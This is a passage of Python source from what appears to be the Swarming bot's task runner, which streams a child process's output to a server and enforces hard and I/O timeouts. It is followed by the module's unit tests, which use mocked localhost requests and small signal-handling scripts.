    stdout: Incremental output since last call, if any.
    output_chunk_start: Total number of stdout previously sent, for coherency
        with the server.
  """"""
  params = params.copy()
  if exit_code is not None:
    params['exit_code'] = exit_code
  if stdout:
    # The output_chunk_start is used by the server to make sure that the stdout
    # chunks are processed and saved in the DB in order.
    params['output'] = base64.b64encode(stdout)
    params['output_chunk_start'] = output_chunk_start
  # TODO(maruel): Support early cancellation.
  # https://code.google.com/p/swarming/issues/detail?id=62
  resp = net.url_read_json(
      swarming_server+'/swarming/api/v1/bot/task_update/%s' % params['task_id'],
      data=params)
  logging.debug('post_update() = %s', resp)
  if resp.get('error'):
    # Abandon it. This will force a process exit.
    raise ValueError(resp.get('error'))


def should_post_update(stdout, now, last_packet):
  """"""Returns True if it's time to send a task_update packet via post_update().

  Sends a packet when one of this condition is met:
  - more than MAX_CHUNK_SIZE of stdout is buffered.
  - last packet was sent more than MIN_PACKET_INTERNAL seconds ago and there was
    stdout.
  - last packet was sent more than MAX_PACKET_INTERVAL seconds ago.
  """"""
  packet_interval = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL
  return len(stdout) >= MAX_CHUNK_SIZE or (now - last_packet) > packet_interval


def calc_yield_wait(task_details, start, last_io, timed_out, stdout):
  """"""Calculates the maximum number of seconds to wait in yield_any().""""""
  now = monotonic_time()
  if timed_out:
    # Give a |grace_period| seconds delay.
    if task_details.grace_period:
      return max(now - timed_out - task_details.grace_period, 0.)
    return 0.

  out = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL
  if task_details.hard_timeout:
    out = min(out, start + task_details.hard_timeout - now)
  if task_details.io_timeout:
    out = min(out, last_io + task_details.io_timeout - now)
  out = max(out, 0)
  logging.debug('calc_yield_wait() = %d', out)
  return out


def kill_and_wait(proc, grace_period, reason):
  logging.warning('SIGTERM finally due to %s', reason)
  proc.terminate()
  try:
    proc.wait(grace_period)
  except subprocess42.TimeoutError:
    logging.warning('SIGKILL finally due to %s', reason)
    proc.kill()
  exit_code = proc.wait()
  logging.info('Waiting for proces exit in finally - done')
  return exit_code


def run_command(
    swarming_server, task_details, work_dir, cost_usd_hour, task_start,
    min_free_space):
  """"""Runs a command and sends packets to the server to stream results back.

  Implements both I/O and hard timeouts. Sends the packets numbered, so the
  server can ensure they are processed in order.

  Returns:
    Metadata about the command.
  """"""
  # TODO(maruel): This function is incomprehensible, split and refactor.
  # Signal the command is about to be started.
  last_packet = start = now = monotonic_time()
  params = {
    'cost_usd': cost_usd_hour * (now - task_start) / 60. / 60.,
    'id': task_details.bot_id,
    'task_id': task_details.task_id,
  }
  post_update(swarming_server, params, None, '', 0)

  if task_details.command:
    # Raw command.
    cmd = task_details.command
    isolated_result = None
  else:
    # Isolated task.
    isolated_result = os.path.join(work_dir, 'isolated_result.json')
    cmd = get_isolated_cmd(
        work_dir, task_details, isolated_result, min_free_space)
    # Hard timeout enforcement is deferred to run_isolated. Grace is doubled to
    # give one 'grace_period' slot to the child process and one slot to upload
    # the results back.
    task_details.hard_timeout = 0
    if task_details.grace_period:
      task_details.grace_period *= 2

  try:
    # TODO(maruel): Support both channels independently and display stderr in
    # red.
    env = None
    if task_details.env:
      env = os.environ.copy()
      for key, value in task_details.env.iteritems():
        if not value:
          env.pop(key, None)
        else:
          env[key] = value
    logging.info('cmd=%s', cmd)
    logging.info('env=%s', env)
    try:
      proc = subprocess42.Popen(
          cmd,
          env=env,
          cwd=work_dir,
          detached=True,
          stdout=subprocess42.PIPE,
          stderr=subprocess42.STDOUT,
          stdin=subprocess42.PIPE)
    except OSError as e:
      stdout = 'Command ""%s"" failed to start.\nError: %s' % (' '.join(cmd), e)
      now = monotonic_time()
      params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.
      params['duration'] = now - start
      params['io_timeout'] = False
      params['hard_timeout'] = False
      post_update(swarming_server, params, 1, stdout, 0)
      return {
        u'exit_code': -1,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure': None,
        u'version': OUT_VERSION,
      }

    output_chunk_start = 0
    stdout = ''
    exit_code = None
    had_hard_timeout = False
    had_io_timeout = False
    must_signal_internal_failure = None
    kill_sent = False
    timed_out = None
    try:
      calc = lambda: calc_yield_wait(
          task_details, start, last_io, timed_out, stdout)
      maxsize = lambda: MAX_CHUNK_SIZE - len(stdout)
      last_io = monotonic_time()
      for _, new_data in proc.yield_any(maxsize=maxsize, timeout=calc):
        now = monotonic_time()
        if new_data:
          stdout += new_data
          last_io = now

        # Post update if necessary.
        if should_post_update(stdout, now, last_packet):
          last_packet = monotonic_time()
          params['cost_usd'] = (
              cost_usd_hour * (last_packet - task_start) / 60. / 60.)
          post_update(swarming_server, params, None, stdout, output_chunk_start)
          output_chunk_start += len(stdout)
          stdout = ''

        # Send signal on timeout if necessary. Both are failures, not
        # internal_failures.
        # Eventually kill but return 0 so bot_main.py doesn't cancel the task.
        if not timed_out:
          if (task_details.io_timeout and
              now - last_io > task_details.io_timeout):
            had_io_timeout = True
            logging.warning('I/O timeout; sending SIGTERM')
            proc.terminate()
            timed_out = monotonic_time()
          elif (task_details.hard_timeout and
              now - start > task_details.hard_timeout):
            had_hard_timeout = True
            logging.warning('Hard timeout; sending SIGTERM')
            proc.terminate()
            timed_out = monotonic_time()
        else:
          # During grace period.
          if not kill_sent and now >= timed_out + task_details.grace_period:
            # Now kill for real. The user can distinguish between the following
            # states:
            # - signal but process exited within grace period,
            #   (hard_|io_)_timed_out will be set but the process exit code will
            #   be script provided.
            # - processed exited late, exit code will be -9 on posix.
            logging.warning('Grace exhausted; sending SIGKILL')
            proc.kill()
            kill_sent = True
      logging.info('Waiting for proces exit')
      exit_code = proc.wait()
    except MustExit as e:
      # TODO(maruel): Do the send SIGTERM to child process and give it
      # task_details.grace_period to terminate.
      must_signal_internal_failure = (
          u'task_runner received signal %s' % e.signal)
      exit_code = kill_and_wait(
          proc, task_details.grace_period, 'signal %d' % e.signal)
    except (IOError, OSError):
      # Something wrong happened, try to kill the child process.
      had_hard_timeout = True
      exit_code = kill_and_wait(
          proc, task_details.grace_period, 'exception %s' % e)

    # This is the very last packet for this command. It if was an isolated task,
    # include the output reference to the archived .isolated file.
    now = monotonic_time()
    params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.
    params['duration'] = now - start
    params['io_timeout'] = had_io_timeout
    params['hard_timeout'] = had_hard_timeout
    if isolated_result:
      try:
        if ((had_io_timeout or had_hard_timeout) and
            not os.path.isfile(isolated_result)):
          # It's possible that run_isolated failed to quit quickly enough; it
          # could be because there was too much data to upload back or something
          # else. Do not create an internal error, just send back the (partial)
          # view as task_runner saw it, for example the real exit_code is
          # unknown.
          logging.warning('TIMED_OUT and there\'s no result file')
          exit_code = -1
        else:
          # See run_isolated.py for the format.
          with open(isolated_result, 'rb') as f:
            run_isolated_result = json.load(f)
          logging.debug('run_isolated:\n%s', run_isolated_result)
          # TODO(maruel): Grab statistics (cache hit rate, data downloaded,
          # mapping time, etc) from run_isolated and push them to the server.
          if run_isolated_result['outputs_ref']:
            params['outputs_ref'] = run_isolated_result['outputs_ref']
          had_hard_timeout = (
              had_hard_timeout or run_isolated_result['had_hard_timeout'])
          params['hard_timeout'] = had_hard_timeout
          if not had_io_timeout and not had_hard_timeout:
            if run_isolated_result['internal_failure']:
              must_signal_internal_failure = (
                  run_isolated_result['internal_failure'])
              logging.error('%s', must_signal_internal_failure)
            elif exit_code:
              # TODO(maruel): Grab stdout from run_isolated.
              must_signal_internal_failure = (
                  'run_isolated internal failure %d' % exit_code)
              logging.error('%s', must_signal_internal_failure)
          exit_code = run_isolated_result['exit_code']
          if run_isolated_result.get('duration') is not None:
            # Calculate the real task duration as measured by run_isolated and
            # calculate the remaining overhead.
            params['bot_overhead'] = params['duration']
            params['duration'] = run_isolated_result['duration']
            params['bot_overhead'] -= params['duration']
            params['bot_overhead'] -= run_isolated_result.get(
                'download', {}).get('duration', 0)
            params['bot_overhead'] -= run_isolated_result.get(
                'upload', {}).get('duration', 0)
            if params['bot_overhead'] < 0:
              params['bot_overhead'] = 0
          stats = run_isolated_result.get('stats')
          if stats:
            params['isolated_stats'] = stats
      except (IOError, OSError, ValueError) as e:
        logging.error('Swallowing error: %s', e)
        if not must_signal_internal_failure:
          must_signal_internal_failure = str(e)
    # TODO(maruel): Send the internal failure here instead of sending it through
    # bot_main, this causes a race condition.
    if exit_code is None:
      exit_code = -1
    post_update(swarming_server, params, exit_code, stdout, output_chunk_start)
    return {
      u'exit_code': exit_code,
      u'hard_timeout': had_hard_timeout,
      u'io_timeout': had_io_timeout,
      u'must_signal_internal_failure': must_signal_internal_failure,
      u'version': OUT_VERSION,
    }
  finally:
    if isolated_result:
      try:
        os.remove(isolated_result)
      except OSError:
        pass


def main(args):
  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)
  parser.add_option('--in-file', help='Name of the request file')
  parser.add_option(
      '--out-file', help='Name of the JSON file to write a task summary to')
  parser.add_option(
      '--swarming-server', help='Swarming server to send data back')
  parser.add_option(
      '--cost-usd-hour', type='float', help='Cost of this VM in $/h')
  parser.add_option('--start', type='float', help='Time this task was started')
  parser.add_option(
      '--min-free-space', type='int',
      help='Value to send down to run_isolated')

  options, args = parser.parse_args(args)
  if not options.in_file or not options.out_file or args:
    parser.error('task_runner is meant to be used by swarming_bot.')

  on_error.report_on_exception_exit(options.swarming_server)

  logging.info('starting')
  now = monotonic_time()
  if options.start > now:
    options.start = now

  try:
    load_and_run(
        options.in_file, options.swarming_server, options.cost_usd_hour,
        options.start, options.out_file, options.min_free_space)
    return 0
  finally:
    logging.info('quitting')
/n/n/nappengine/swarming/swarming_bot/bot_code/task_runner_test.py/n/n#!/usr/bin/env python
# coding=utf-8
# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import base64
import json
import logging
import os
import signal
import shutil
import sys
import tempfile
import time
import unittest

import test_env_bot_code
test_env_bot_code.setup_test_env()

# Creates a server mock for functions in net.py.
import net_utils

from api import os_utilities
from depot_tools import fix_encoding
from utils import file_path
from utils import large
from utils import logging_utils
from utils import subprocess42
from utils import tools
import fake_swarming
import task_runner

CLIENT_DIR = os.path.normpath(
    os.path.join(test_env_bot_code.BOT_DIR, '..', '..', '..', 'client'))

sys.path.insert(0, os.path.join(CLIENT_DIR, 'tests'))
import isolateserver_mock


def get_manifest(script=None, inputs_ref=None, **kwargs):
  out = {
    'bot_id': 'localhost',
    'command':
        [sys.executable, '-u', '-c', script] if not inputs_ref else None,
    'env': {},
    'extra_args': [],
    'grace_period': 30.,
    'hard_timeout': 10.,
    'inputs_ref': inputs_ref,
    'io_timeout': 10.,
    'task_id': 23,
  }
  out.update(kwargs)
  return out


class TestTaskRunnerBase(net_utils.TestCase):
  def setUp(self):
    super(TestTaskRunnerBase, self).setUp()
    self.root_dir = tempfile.mkdtemp(prefix='task_runner')
    logging.info('Temp: %s', self.root_dir)
    self.work_dir = os.path.join(self.root_dir, 'work')
    os.chdir(self.root_dir)
    os.mkdir(self.work_dir)
    # Create the logs directory so run_isolated.py can put its log there.
    os.mkdir(os.path.join(self.root_dir, 'logs'))

    self.mock(
        task_runner, 'get_run_isolated',
        lambda: [sys.executable, os.path.join(CLIENT_DIR, 'run_isolated.py')])

  def tearDown(self):
    os.chdir(test_env_bot_code.BOT_DIR)
    try:
      file_path.rmtree(self.root_dir)
    except OSError:
      print >> sys.stderr, 'Failed to delete %s' % self.root_dir
    finally:
      super(TestTaskRunnerBase, self).tearDown()

  @classmethod
  def get_task_details(cls, *args, **kwargs):
    return task_runner.TaskDetails(get_manifest(*args, **kwargs))

  def gen_requests(self, cost_usd=0., **kwargs):
    return [
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        self.get_check_first(cost_usd),
        {},
      ),
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        self.get_check_final(**kwargs),
        {},
      ),
    ]

  def requests(self, **kwargs):
    """"""Generates the expected HTTP requests for a task run.""""""
    self.expected_requests(self.gen_requests(**kwargs))

  def get_check_first(self, cost_usd):
    def check_first(kwargs):
      self.assertLessEqual(cost_usd, kwargs['data'].pop('cost_usd'))
      self.assertEqual(
        {
          'data': {
            'id': 'localhost',
            'task_id': 23,
          },
        },
        kwargs)
    return check_first


class TestTaskRunner(TestTaskRunnerBase):
  def setUp(self):
    super(TestTaskRunner, self).setUp()
    self.mock(time, 'time', lambda: 1000000000.)

  def get_check_final(self, exit_code=0, output='hi\n', outputs_ref=None):
    def check_final(kwargs):
      # It makes the diffing easier.
      if 'output' in kwargs['data']:
        kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])
      expected = {
        'data': {
          'cost_usd': 10.,
          'duration': 0.,
          'exit_code': exit_code,
          'hard_timeout': False,
          'id': 'localhost',
          'io_timeout': False,
          'output': output,
          'output_chunk_start': 0,
          'task_id': 23,
        },
      }
      if outputs_ref:
        expected['data']['outputs_ref'] = outputs_ref
      self.assertEqual(expected, kwargs)
    return check_final

  def _run_command(self, task_details):
    start = time.time()
    self.mock(time, 'time', lambda: start + 10)
    server = 'https://localhost:1'
    return task_runner.run_command(
        server, task_details, self.work_dir, 3600., start, 1)

  def test_load_and_run_raw(self):
    server = 'https://localhost:1'

    def run_command(
        swarming_server, task_details, work_dir, cost_usd_hour, start,
        min_free_space):
      self.assertEqual(server, swarming_server)
      # Necessary for OSX.
      self.assertEqual(
          os.path.realpath(self.work_dir), os.path.realpath(work_dir))
      self.assertTrue(isinstance(task_details, task_runner.TaskDetails))
      self.assertEqual(3600., cost_usd_hour)
      self.assertEqual(time.time(), start)
      self.assertEqual(1, min_free_space)
      return {
        u'exit_code': 1,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure': None,
        u'version': task_runner.OUT_VERSION,
      }
    self.mock(task_runner, 'run_command', run_command)

    manifest = os.path.join(self.root_dir, 'manifest')
    with open(manifest, 'wb') as f:
      data = {
        'bot_id': 'localhost',
        'command': ['a'],
        'env': {'d': 'e'},
        'extra_args': [],
        'grace_period': 30.,
        'hard_timeout': 10,
        'inputs_ref': None,
        'io_timeout': 11,
        'task_id': 23,
      }
      json.dump(data, f)

    out_file = os.path.join(self.root_dir, 'work', 'task_runner_out.json')
    task_runner.load_and_run(manifest, server, 3600., time.time(), out_file, 1)
    expected = {
      u'exit_code': 1,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    with open(out_file, 'rb') as f:
      self.assertEqual(expected, json.load(f))

  def test_load_and_run_isolated(self):
    self.expected_requests([])
    server = 'https://localhost:1'

    def run_command(
        swarming_server, task_details, work_dir, cost_usd_hour, start,
        min_free_space):
      self.assertEqual(server, swarming_server)
      # Necessary for OSX.
      self.assertEqual(
          os.path.realpath(self.work_dir), os.path.realpath(work_dir))
      self.assertTrue(isinstance(task_details, task_runner.TaskDetails))
      self.assertEqual(3600., cost_usd_hour)
      self.assertEqual(time.time(), start)
      self.assertEqual(1, min_free_space)
      return {
        u'exit_code': 0,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure': None,
        u'version': task_runner.OUT_VERSION,
      }
    self.mock(task_runner, 'run_command', run_command)

    manifest = os.path.join(self.root_dir, 'manifest')
    with open(manifest, 'wb') as f:
      data = {
        'bot_id': 'localhost',
        'command': None,
        'env': {'d': 'e'},
        'extra_args': ['foo', 'bar'],
        'grace_period': 30.,
        'hard_timeout': 10,
        'io_timeout': 11,
        'inputs_ref': {
          'isolated': '123',
          'isolatedserver': 'http://localhost:1',
          'namespace': 'default-gzip',
        },
        'task_id': 23,
      }
      json.dump(data, f)

    out_file = os.path.join(self.root_dir, 'work', 'task_runner_out.json')
    task_runner.load_and_run(manifest, server, 3600., time.time(), out_file, 1)
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    with open(out_file, 'rb') as f:
      self.assertEqual(expected, json.load(f))

  def test_run_command_raw(self):
    # This runs the command for real.
    self.requests(cost_usd=1, exit_code=0)
    task_details = self.get_task_details('print(\'hi\')')
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_run_command_isolated(self):
    # This runs the command for real.
    self.requests(
        cost_usd=1, exit_code=0,
        outputs_ref={
          u'isolated': u'123',
          u'isolatedserver': u'http://localhost:1',
          u'namespace': u'default-gzip',
        })
    task_details = self.get_task_details(inputs_ref={
      'isolated': '123',
      'isolatedserver': 'localhost:1',
      'namespace': 'default-gzip',
    }, extra_args=['foo', 'bar'])
    # Mock running run_isolated with a script.
    SCRIPT_ISOLATED = (
      'import json, sys;\n'
      'if len(sys.argv) != 2:\n'
      '  raise Exception(sys.argv);\n'
      'with open(sys.argv[1], \'wb\') as f:\n'
      '  json.dump({\n'
      '    \'exit_code\': 0,\n'
      '    \'had_hard_timeout\': False,\n'
      '    \'internal_failure\': None,\n'
      '    \'outputs_ref\': {\n'
      '      \'isolated\': \'123\',\n'
      '      \'isolatedserver\': \'http://localhost:1\',\n'
      '       \'namespace\': \'default-gzip\',\n'
      '    },\n'
      '  }, f)\n'
      'sys.stdout.write(\'hi\\n\')')
    self.mock(
        task_runner, 'get_isolated_cmd',
        lambda _work_dir, _details, isolated_result, min_free_space:
          [sys.executable, '-u', '-c', SCRIPT_ISOLATED, isolated_result])
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_run_command_fail(self):
    # This runs the command for real.
    self.requests(cost_usd=10., exit_code=1)
    task_details = self.get_task_details(
        'import sys; print(\'hi\'); sys.exit(1)')
    expected = {
      u'exit_code': 1,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_run_command_os_error(self):
    # This runs the command for real.
    # OS specific error, fix expectation for other OSes.
    output = (
      'Command ""executable_that_shouldnt_be_on_your_system '
      'thus_raising_OSError"" failed to start.\n'
      'Error: [Error 2] The system cannot find the file specified'
      ) if sys.platform == 'win32' else (
      'Command ""executable_that_shouldnt_be_on_your_system '
      'thus_raising_OSError"" failed to start.\n'
      'Error: [Errno 2] No such file or directory')
    self.requests(cost_usd=10., exit_code=1, output=output)
    task_details = task_runner.TaskDetails(
        {
          'bot_id': 'localhost',
          'command': [
            'executable_that_shouldnt_be_on_your_system',
            'thus_raising_OSError',
          ],
          'env': {},
          'extra_args': [],
          'grace_period': 30.,
          'hard_timeout': 6,
          'inputs_ref': None,
          'io_timeout': 6,
          'task_id': 23,
        })
    expected = {
      u'exit_code': -1,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_run_command_large(self):
    # Method should have ""self"" as first argument - pylint: disable=E0213
    class Popen(object):
      """"""Mocks the process so we can control how data is returned.""""""
      def __init__(self2, cmd, cwd, env, stdout, stderr, stdin, detached):
        self.assertEqual(task_details.command, cmd)
        self.assertEqual(self.work_dir, cwd)
        expected_env = os.environ.copy()
        expected_env['foo'] = 'bar'
        self.assertEqual(expected_env, env)
        self.assertEqual(subprocess42.PIPE, stdout)
        self.assertEqual(subprocess42.STDOUT, stderr)
        self.assertEqual(subprocess42.PIPE, stdin)
        self.assertEqual(True, detached)
        self2._out = [
          'hi!\n',
          'hi!\n',
          'hi!\n' * 100000,
          'hi!\n',
        ]

      def yield_any(self2, maxsize, timeout):
        self.assertLess(0, maxsize)
        self.assertLess(0, timeout)
        for i in self2._out:
          yield 'stdout', i

      @staticmethod
      def wait():
        return 0

      @staticmethod
      def kill():
        self.fail()

    self.mock(subprocess42, 'Popen', Popen)

    def check_final(kwargs):
      self.assertEqual(
          {
            'data': {
              # That's because the cost includes the duration starting at start,
              # not when the process was started.
              'cost_usd': 10.,
              'duration': 0.,
              'exit_code': 0,
              'hard_timeout': False,
              'id': 'localhost',
              'io_timeout': False,
              'output': base64.b64encode('hi!\n'),
              'output_chunk_start': 100002*4,
              'task_id': 23,
            },
          },
          kwargs)

    requests = [
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        {
          'data': {
            'cost_usd': 10.,
            'id': 'localhost',
            'task_id': 23,
          },
        },
        {},
      ),
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        {
          'data': {
            'cost_usd': 10.,
            'id': 'localhost',
            'output': base64.b64encode('hi!\n' * 100002),
            'output_chunk_start': 0,
            'task_id': 23,
          },
        },
        {},
      ),
      (
        'https://localhost:1/swarming/api/v1/bot/task_update/23',
        check_final,
        {},
      ),
    ]
    self.expected_requests(requests)
    task_details = task_runner.TaskDetails(
        {
          'bot_id': 'localhost',
          'command': ['large', 'executable'],
          'env': {'foo': 'bar'},
          'extra_args': [],
          'grace_period': 30.,
          'hard_timeout': 60,
          'inputs_ref': None,
          'io_timeout': 60,
          'task_id': 23,
        })
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_main(self):
    def load_and_run(
        manifest, swarming_server, cost_usd_hour, start, json_file,
        min_free_space):
      self.assertEqual('foo', manifest)
      self.assertEqual('http://localhost', swarming_server)
      self.assertEqual(3600., cost_usd_hour)
      self.assertEqual(time.time(), start)
      self.assertEqual('task_summary.json', json_file)
      self.assertEqual(1, min_free_space)

    self.mock(task_runner, 'load_and_run', load_and_run)
    cmd = [
      '--swarming-server', 'http://localhost',
      '--in-file', 'foo',
      '--out-file', 'task_summary.json',
      '--cost-usd-hour', '3600',
      '--start', str(time.time()),
      '--min-free-space', '1',
    ]
    self.assertEqual(0, task_runner.main(cmd))

  def test_main_reboot(self):
    def load_and_run(
        manifest, swarming_server, cost_usd_hour, start, json_file,
        min_free_space):
      self.assertEqual('foo', manifest)
      self.assertEqual('http://localhost', swarming_server)
      self.assertEqual(3600., cost_usd_hour)
      self.assertEqual(time.time(), start)
      self.assertEqual('task_summary.json', json_file)
      self.assertEqual(1, min_free_space)

    self.mock(task_runner, 'load_and_run', load_and_run)
    cmd = [
      '--swarming-server', 'http://localhost',
      '--in-file', 'foo',
      '--out-file', 'task_summary.json',
      '--cost-usd-hour', '3600',
      '--start', str(time.time()),
      '--min-free-space', '1',
    ]
    self.assertEqual(0, task_runner.main(cmd))


class TestTaskRunnerNoTimeMock(TestTaskRunnerBase):
  # Do not mock time.time() for these tests otherwise it becomes a tricky
  # implementation detail check.
  # These test cases run the command for real.

  # TODO(maruel): Calculate this value automatically through iteration?
  SHORT_TIME_OUT = 0.3

  # Here's a simple script that handles signals properly. Sadly SIGBREAK is not
  # defined on posix.
  SCRIPT_SIGNAL = (
    'import signal, sys, time;\n'
    'l = [];\n'
    'def handler(signum, _):\n'
    '  l.append(signum);\n'
    '  print(\'got signal %%d\' %% signum);\n'
    '  sys.stdout.flush();\n'
    'signal.signal(%s, handler);\n'
    'print(\'hi\');\n'
    'sys.stdout.flush();\n'
    'while not l:\n'
    '  try:\n'
    '    time.sleep(0.01);\n'
    '  except IOError:\n'
    '    pass;\n'
    'print(\'bye\')') % (
        'signal.SIGBREAK' if sys.platform == 'win32' else 'signal.SIGTERM')

  SCRIPT_SIGNAL_HANG = (
    'import signal, sys, time;\n'
    'l = [];\n'
    'def handler(signum, _):\n'
    '  l.append(signum);\n'
    '  print(\'got signal %%d\' %% signum);\n'
    '  sys.stdout.flush();\n'
    'signal.signal(%s, handler);\n'
    'print(\'hi\');\n'
    'sys.stdout.flush();\n'
    'while not l:\n'
    '  try:\n'
    '    time.sleep(0.01);\n'
    '  except IOError:\n'
    '    pass;\n'
    'print(\'bye\');\n'
    'time.sleep(100)') % (
        'signal.SIGBREAK' if sys.platform == 'win32' else 'signal.SIGTERM')

  SCRIPT_HANG = 'import time; print(\'hi\'); time.sleep(100)'

  def get_check_final(
      self, hard_timeout=False, io_timeout=False, exit_code=None,
      output='hi\n'):
    def check_final(kwargs):
      if hard_timeout or io_timeout:
        self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('cost_usd'))
        self.assertLess(self.SHORT_TIME_OUT, kwargs['data'].pop('duration'))
      else:
        self.assertLess(0., kwargs['data'].pop('cost_usd'))
        self.assertLess(0., kwargs['data'].pop('duration'))
      # It makes the diffing easier.
      kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])
      self.assertEqual(
          {
            'data': {
              'exit_code': exit_code,
              'hard_timeout': hard_timeout,
              'id': 'localhost',
              'io_timeout': io_timeout,
              'output': output,
              'output_chunk_start': 0,
              'task_id': 23,
            },
          },
          kwargs)
    return check_final

  def _load_and_run(self, manifest):
    # Dot not mock time since this test class is testing timeouts.
    server = 'https://localhost:1'
    in_file = os.path.join(self.work_dir, 'task_runner_in.json')
    with open(in_file, 'wb') as f:
      json.dump(manifest, f)
    out_file = os.path.join(self.work_dir, 'task_runner_out.json')
    task_runner.load_and_run(in_file, server, 3600., time.time(), out_file, 1)
    with open(out_file, 'rb') as f:
      return json.load(f)

  def _run_command(self, task_details):
    # Dot not mock time since this test class is testing timeouts.
    server = 'https://localhost:1'
    return task_runner.run_command(
        server, task_details, self.work_dir, 3600., time.time(), 1)

  def test_hard(self):
    # Actually 0xc000013a
    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM
    self.requests(hard_timeout=True, exit_code=sig)
    task_details = self.get_task_details(
        self.SCRIPT_HANG, hard_timeout=self.SHORT_TIME_OUT)
    expected = {
      u'exit_code': sig,
      u'hard_timeout': True,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_io(self):
    # Actually 0xc000013a
    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM
    self.requests(io_timeout=True, exit_code=sig)
    task_details = self.get_task_details(
        self.SCRIPT_HANG, io_timeout=self.SHORT_TIME_OUT)
    expected = {
      u'exit_code': sig,
      u'hard_timeout': False,
      u'io_timeout': True,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_hard_signal(self):
    self.requests(
        hard_timeout=True,
        exit_code=0,
        output='hi\ngot signal %d\nbye\n' % task_runner.SIG_BREAK_OR_TERM)
    task_details = self.get_task_details(
        self.SCRIPT_SIGNAL, hard_timeout=self.SHORT_TIME_OUT)
    # Returns 0 because the process cleaned up itself.
    expected = {
      u'exit_code': 0,
      u'hard_timeout': True,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_io_signal(self):
    self.requests(
        io_timeout=True, exit_code=0,
        output='hi\ngot signal %d\nbye\n' % task_runner.SIG_BREAK_OR_TERM)
    task_details = self.get_task_details(
        self.SCRIPT_SIGNAL, io_timeout=self.SHORT_TIME_OUT)
    # Returns 0 because the process cleaned up itself.
    expected = {
      u'exit_code': 0,
      u'hard_timeout': False,
      u'io_timeout': True,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_hard_no_grace(self):
    # Actually 0xc000013a
    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM
    self.requests(hard_timeout=True, exit_code=sig)
    task_details = self.get_task_details(
        self.SCRIPT_HANG, hard_timeout=self.SHORT_TIME_OUT,
        grace_period=self.SHORT_TIME_OUT)
    expected = {
      u'exit_code': sig,
      u'hard_timeout': True,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_io_no_grace(self):
    # Actually 0xc000013a
    sig = -1073741510 if sys.platform == 'win32' else -signal.SIGTERM
    self.requests(io_timeout=True, exit_code=sig)
    task_details = self.get_task_details(
        self.SCRIPT_HANG, io_timeout=self.SHORT_TIME_OUT,
        grace_period=self.SHORT_TIME_OUT)
    expected = {
      u'exit_code': sig,
      u'hard_timeout': False,
      u'io_timeout': True,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_hard_signal_no_grace(self):
    exit_code = 1 if sys.platform == 'win32' else -signal.SIGKILL
    self.requests(
        hard_timeout=True, exit_code=exit_code,
        output='hi\ngot signal %d\nbye\n' % task_runner.SIG_BREAK_OR_TERM)
    task_details = self.get_task_details(
        self.SCRIPT_SIGNAL_HANG, hard_timeout=self.SHORT_TIME_OUT,
        grace_period=self.SHORT_TIME_OUT)
    # Returns 0 because the process cleaned up itself.
    expected = {
      u'exit_code': exit_code,
      u'hard_timeout': True,
      u'io_timeout': False,
      u'must_signal_internal_failure': None,
      u'version': task_runner.OUT_VERSION,
    }
    self.assertEqual(expected, self._run_command(task_details))

  def test_io_signal_no_grace(self):
    exit_code = 1 if sys.platform == 'win32' else -signal.SIGKILL
    self.requests(
        io_timeout=True, exit_code=exit_code,
        output='hi\ngot signal %d\nbye\n' % task_runner.SIG_BREAK_OR_TERM)
    task_details = self.get_task_details(
        self.SCRIPT_SIGNAL_HANG, io_timeout=self.SHORT_TIME_OUT,
